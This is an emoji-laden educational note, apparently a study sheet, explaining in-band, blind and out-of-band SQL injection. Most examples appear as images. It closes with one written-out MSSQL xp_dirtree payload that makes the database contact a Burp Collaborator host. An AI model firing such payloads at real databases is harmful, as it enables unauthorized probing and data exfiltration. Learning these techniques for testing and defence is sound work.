- - -
# Types Of SQL Injection : 

![Imgur](https://i.imgur.com/sXG7owp.png)


- - -
## 1. In-band SQLi : 🥁📯🎹

🦑 **In-Band SQLi** occurs when attacker uses the same communication channel to both launch the attack and gather the results of the attack.  All the retrived data is presented on the application web-page. 
🦑 It is Easier to exploit than other categories of SQLi.  😂😂😂


#### 1.1 Error Based : ⚠️ 🚨

⛩️ **Error Based SQLi** is an in-band  SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injection.

⛩️ **Example** :- 
![Imgur](https://i.imgur.com/TFl7u9v.png)


#### 1.2 Union Based : 🙏🙏

🏵️ **Union-Based SQLi** is an in-band SQLi technique that leverages the `UNION SQL` Operator to combine the results of two queries into a single result set.
 
🏵️ **Example** :- 
![Imgur](https://i.imgur.com/aPUBtQS.png)


## 2. Inferential ( Blind ) SQLi : 🙈 👀

❄️ A SQLi Vulnerability where there is no actual transfer of data via the web application.
❄️ It is just as dangerous as In-Band SQLi.
	🔴 Attacker able  to reconstruct  the information by sending particular requests and observing the result behaviour of the DB server.
	🔴 In simple words atrtacker will not be able to see the error message but he will able to see the application's strange behaviour.
❄️ Takes longer time to exploitthan In-Band SQLi.
❄️ Two common types of Blind SQLi :- 
	⚜️ Boolean-based SQLi.
	⚜️ Time-Based SQLi.

#### 2.1 Boolean-Based SQLi : 💥🔥

![Imgur](https://i.imgur.com/oAWIvyt.png)

🦄 Here we are trying to verify the statement with either making a true or a flase statement.

🦄 Down here we can see we have a admin credentials in our DB. 
🦄 An attacker makes an query to ask the DB, if from the first character to the first character ( means only 1st char ) is = '**s**'.  

![Look Me Carefully and read me](https://i.imgur.com/OvRk6gn.png)

#### 2.2 Time-based SQLi : ⏳

👽 Time Based SQLi is a blind SQLi technique that relies on the database pausing for specified amount of time, then returning the results, indicating a successful SQL Query execution.
👽 **Example Query** :- 
If the first character of the adminnistrator's hashed password is "**a**", wait for 10 seconds.
- Response takes 10 seconds  `-->`  first letter is "**a**"
- Response doesn't takes 10 seconds  `-->`  first letter is not "**a**".


## 3. Out-Of-Band SQLi : 📯 

🎒 Also known as OAST.
🎒 Vulnerability that consists of triggering an out-of-band network connection to a system that you control.
		🍥 Not common.
		🍥 A variety of protocols can be used ( ex: DNS, HTTP )
🎒 Example Payload: 

```SQL
'; exec master..xp_dirtree '//cm0329rjjf239hrf9h3t3uday.burpcollaborator.net/a'--
```

- - -

